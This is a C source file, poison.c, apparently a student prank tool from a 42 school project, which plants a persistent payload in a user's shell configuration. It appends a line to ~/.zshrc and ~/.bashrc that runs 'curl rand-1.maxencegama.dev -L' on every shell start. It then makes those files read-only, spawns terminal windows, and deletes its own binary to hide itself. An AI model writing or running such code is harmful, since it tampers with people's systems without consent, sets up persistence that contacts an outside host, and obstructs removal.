/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   poison.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/06/22 01:28:09 by mgama             #+#    #+#             */
/*   Updated: 2023/07/06 10:57:50 by mgama            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../utils/process.h"
#include "../utils/time.h"

int	copy_alias(char **envp)
{
	int			i;
	int			fd;
	char		*path;
	// static char	*command = "curl parrot.live";
	static char	*command = "curl rand-1.maxencegama.dev -L";
	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};

	(void)(envp);
	printf("\033[36mStart shell rc modifications...\033[0m\n");
	i = -1;
	while (file_list[++i])
	{
		path = ft_strjoin(getenv("HOME"), file_list[i]);
		if (!path)
			return (1);
		printf("opening and writing in %s\n", path);
		chmod(path, 0644);
		fd = open(path, O_CREAT | O_RDWR | O_APPEND);
		if (fd < 0)
			return (dprintf(2, "Could not open %s\n", path), free(path), 1);
		dprintf(fd, "GMVRA=\"%lu\"; echo '\e(0'; %s\n", ft_abs_time(), command);
		// dprintf(fd, "%s\n", command); // add plain command
		close(fd);
		chmod(path, 0444);
		free(path);
	}
	printf("--------------------\n");
	return (0);
}

int	main(int ac, char **av, char **envp)
{
	int		i;
	char	home_buffer[PATH_MAX];
	char	*osxterm_cmd[] = {"open", "-a", "Terminal", NULL};

	(void)(ac);
	realpath(av[0], home_buffer);
	printf("currrent file path = %s\n", home_buffer);
	copy_alias(envp);
	i = -1;
	while (++i < max(ft_abs_time() % 2, 1))
	{
#if __APPLE__
		process_child(osxterm_cmd, envp);
#else
		system("gnome-terminal");
#endif /* __APPLE__ */
	}
	if (ft_strnrcmp(av[0], "poison", 6) != 0)
		if (remove(home_buffer) < 0)
			dprintf(2, "Could not remove file %s", home_buffer), perror("");
	return (0);
}
